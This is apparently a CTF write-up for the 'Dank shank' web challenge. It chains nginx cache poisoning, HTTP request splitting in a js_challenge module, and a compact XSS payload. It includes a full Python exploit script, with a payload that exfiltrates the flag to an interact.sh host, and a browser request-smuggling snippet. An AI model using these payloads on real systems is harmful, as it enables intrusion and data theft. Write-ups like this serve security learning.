# Dank shank

> Strong shark protection!
> 
> Attachment: https://s3.cdn.justctf.team/bcbaa7ae-cc27-494f-8c65-6c1e22953e05/shark.zip

## Challenge

The hard of this challenge is evaluating a long js payload ( for fetching the flag and stuff ) with only 64 bytes of html.
Normally you would do `<img src=1 onerror=eval(window.name)>` but the xss bot doens't have access to internet.

## admin page

```html
<html>
<head>
    <title>Dank Shark</title>
</head>
<body>
<div>
    Last comment nickname: <div id="nickname">Maybe loading...</div>
</div>
</body>
<script>
    async function getNickname() {
        let data;
        try {
            const resp = await fetch(`/admin/api/v1/last_nickname`);
            if(resp.status !== 200) {
                throw Error('status not 200');
            }
            data = await resp.text();
            data = JSON.parse(data)['response']['nickname'];
        } catch (e) {
        }
        return data;
    }

    (async () => {
        document.querySelector("#nickname").innerHTML = await getNickname();
    })()
</script>
</html>
```

xss bot automatically goes to this page. The response of `last_nickname` is controllable by us but there is a check on that endpoint
that checks if the remote ip is not locahost. 
The first challenge is to bypass this mechanism 
## First part - Cache poisoning

There is a cache poisoning vulnerablity that is due to the misconfiguration of nginx.

```
proxy_cache_key "$language$request_uri";
```

`$request_uri` is `request_path+request_querystring` and `$language` is the `Accept-language` header of the request.

The requester ip address is not inside the cache key so we can use this vulnerablity to bypass the `last_nickname` endpoint protection.

## Second part - Weird http-js-challenge nginx module

This bug was quite fun to spot and exploit.
We actually found this bug by luck and somebody sent a POST request to somewhere and saw two responses in body.
After looking into this behavior, We concluded that the module doesn't clean the request body from the request buffer and we can get http request splitting primitives with it. 

```
GET / HTTP/1.1\r\n
Host: example.org\r\n
Content-Length: 30\r\n
\r\n
GET /hack HTTP/1.1\r\n
example: 
```

When the nginx module receives the above request, it doesn't read the body so the next request that it handles is the `GET /hack` request.
The splitted request is not fully sent (The last two CRLFs are not sent) so the next request that nginx receives goes inside that request.

That means that next request that the module handles is
```
GET /hack HTTP/1.1\r\n
example: GET / HTTP/1.1\r\n
Host: example.org\r\n
Header: header\r\n
\r\n
```

More details from the author:
> The bug in the js_challange module is here:
> 
> https://github.com/simon987/ngx_http_js_challenge_module/blob/master/ngx_http_js_challenge.c#L240
> 
> there is a missing ngx_http_discard_request_body(r)
> 
> So this module doesn't clean the request body
> 
> It is only exploitable with specific nginx configuration (keepalive connection on proxy_pass)

## Third part - Chaining the bugs

The following payload contains an infinite loop that keeps evaluating the `/last_nickname` endpoint response.

```html
<style onload="z=_=>getNickname().then(r=>eval('`'+z()+r));z()">
```

> This payload is the result of hours of hard-work and pain :')

Because this payload keeps requesting `/last_nickname`, we can use the request smuggling vulnerablity to change
the path of the request to somewhere with longer length limit.

Execute the following exploit before triggering the xss bot.
```py
#!/usr/bin/env python3
import requests
import time

# target = 'http://acrfd84eanl1n3w82ogr1xrec4habm.dank-shark.web.jctf.pro'
# resCookie = '26E78C1654D95E4FBBF6090FCFB9D2CDF4D8270570832'

target = 'http://7yovvqosk90obni8thovwgvek6cnr4.dank-shark.web.jctf.pro'
resCookie = '7174E38A014BD0E4CFDA2F8059896856FA6F13623486'

firstPayload = """`;fetch(`//0:1337`).then(r=>r.text()).then(r=>fetch(`//`+r.replace(`{`,``).replace(`}`,``)+`.cajv6f92vtc00008znt0gfjpu8ayyyyyb.interact.sh/`));//"""
print(len(firstPayload))

r = requests.post(f'{target}/api/v1/add_comment',cookies={
    'res':resCookie
},json={
    'comment':firstPayload,'nickname':"AAA"
})
print(r.text)


firstPayload = """<style onload="z=_=>getNickname().then(r=>eval('`'+z()+r));z()">"""
print(len(firstPayload))

r = requests.post(f'{target}/api/v1/add_comment',cookies={
    'res':resCookie
},json={
    'comment':"FFFFFFFFFff",'nickname':firstPayload
})
print(r.text)

while(1):
    requests.get(f'{target}/admin/api/v1/last_nickname',cookies={
        'res':resCookie
    })
    time.sleep(0.1)
```

And Execute the following payload on your browser about 10 seconds after clicking on the xss-bot visit button.
```js
    res = '7174E38A014BD0E4CFDA2F8059896856FA6F13623486'
    setInterval(()=>{
        fetch('/admin/changeroute',{method:"POST",body:"GET /api/v1/comments HTTP/1.1\r\nCookie:res="+res+"\r\nV:"})
    },100)
```

> by renwa,as3617,parrot
